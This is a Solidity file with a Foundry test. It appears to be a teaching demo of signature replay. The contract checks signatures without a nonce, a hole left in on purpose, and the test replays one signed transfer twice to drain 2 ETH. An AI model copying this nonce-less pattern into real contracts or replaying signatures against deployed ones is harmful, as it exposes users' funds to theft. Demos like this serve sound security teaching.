// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @title Vulnerable contract - signature replay demo
contract ReplayVulnerableSimple {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice Transfer using simple signature (no nonce, replayable)
    function transfer(
        address from,
        address to,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        bytes32 msgHash = keccak256(abi.encodePacked(from, to, amount));
        address signer = ecrecover(msgHash, v, r, s);
        require(signer == from, "Bad signature");

        // No nonce → same signature can be reused
        require(balances[from] >= amount, "Not enough balance");
        balances[from] -= amount;
        balances[to] += amount;
    }
}

/// @title Foundry test for signature replay attack
contract SignatureReplaySimpleTest is Test {
    ReplayVulnerableSimple victim;
    address alice;
    uint256 alicePk;
    address bob = address(0xB0B);

    function setUp() public {
        victim = new ReplayVulnerableSimple();
        (alice, alicePk) = makeAddrAndKey("alice");

        // Alice deposits 5 ETH
        vm.deal(alice, 5 ether);
        vm.prank(alice);
        victim.deposit{value: 5 ether}();
    }

    function testReplayAttack() public {
        // Alice signs simple hash
        bytes32 hash = keccak256(abi.encodePacked(alice, bob, uint(1 ether)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, hash);

        // First transfer
        victim.transfer(alice, bob, 1 ether, v, r, s);

        // Replay attack: same sig again
        victim.transfer(alice, bob, 1 ether, v, r, s);

        emit log_named_uint("Alice balance", victim.balances(alice));
        emit log_named_uint("Bob balance", victim.balances(bob));

        // Replay succeeded
        assertEq(victim.balances(bob), 2 ether, "Bob got 2 ETH from replay");
        assertEq(
            victim.balances(alice),
            3 ether,
            "Alice lost 2 ETH instead of 1"
        );
    }
}
